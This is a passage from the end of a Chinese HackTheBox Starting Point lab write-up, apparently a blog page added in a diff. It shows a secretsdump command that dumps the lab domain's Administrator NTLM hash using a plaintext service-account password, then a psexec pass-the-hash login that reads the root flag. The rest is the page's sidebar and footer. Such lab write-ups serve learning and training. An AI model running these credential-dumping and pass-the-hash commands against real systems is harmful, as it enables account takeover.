+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -dc-ip 10.10.10.30 megacorp.local/svc_bes:Sheffield19@10.10.10.30</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::</span><br></pre></td></tr></table></figure>
+<p>使用Hash登入</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py megacorp.local/administraor@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18</span><br><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line">ee613b2d048303e5fd4ac6647d944645</span><br></pre></td></tr></table></figure>
+<hr />
+<p>几台靶机下来还是学到了不少东西<br />
+<s>还是自己太菜了</s><br />
+剩下的StartPoint靶机需要VIP才能访问<br />
+等哪天心血来潮开了VIP再说吧</p>
+<p>EOF</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>xXxYOLOxXx
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://yoloyolo.top/2021/06/04/HackTheBox-Start-Point/" title="HackTheBox_Start_Point">https://yoloyolo.top/2021/06/04/HackTheBox-Start-Point/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pentest/" rel="tag"># Pentest</a>
+              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
+              <a href="/tags/Windows/" rel="tag"># Windows</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/05/31/Reverse-3/" rel="prev" title="Reverse_3">
+      <i class="fa fa-chevron-left"></i> Reverse_3
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/06/09/HackTheBox-Windows-Set-0/" rel="next" title="HackTheBox_Windows_Set_0">
+      HackTheBox_Windows_Set_0 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hackthebox_archetype"><span class="nav-number">1.</span> <span class="nav-text"> HackTheBox_Archetype</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.3.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hackthebox_oopsie"><span class="nav-number">2.</span> <span class="nav-text"> HackTheBox_Oopsie</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-2"><span class="nav-number">2.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="nav-number">2.2.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-2"><span class="nav-number">2.3.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hackthebox_archetype-2"><span class="nav-number">3.</span> <span class="nav-text"> HackTheBox_Archetype</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-3"><span class="nav-number">3.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-3"><span class="nav-number">3.2.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-3"><span class="nav-number">3.3.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hackthebox_shield"><span class="nav-number">4.</span> <span class="nav-text"> HackTheBox_Shield</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-4"><span class="nav-number">4.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E6%89%AB%E6%8F%8F"><span class="nav-number">4.2.</span> <span class="nav-text"> 路径扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-4"><span class="nav-number">4.3.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-4"><span class="nav-number">4.4.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hackthebox_pathfinder"><span class="nav-number">5.</span> <span class="nav-text"> HackTheBox_Pathfinder</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-5"><span class="nav-number">5.1.</span> <span class="nav-text"> 端口扫描</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">xXxYOLOxXx</p>
+  <div class="site-description" itemprop="description">Explorer for unknown.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">48</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">51</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/monster414" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monster414" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yolo-yolo@qq.com" title="E-Mail → mailto:yolo-yolo@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://music.163.com/#/user/home?id=302397927" title="CloudMisuc → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;302397927" rel="noopener" target="_blank"><i class=" fa-fw"></i>CloudMisuc</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://steamcommunity.com/id/Purple_Miracle/" title="Steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;id&#x2F;Purple_Miracle&#x2F;" rel="noopener" target="_blank"><i class=" fa-fw"></i>Steam</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://yoloyolo.top/atom.xml" title="RSS → https:&#x2F;&#x2F;yoloyolo.top&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xXxYOLOxXx</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
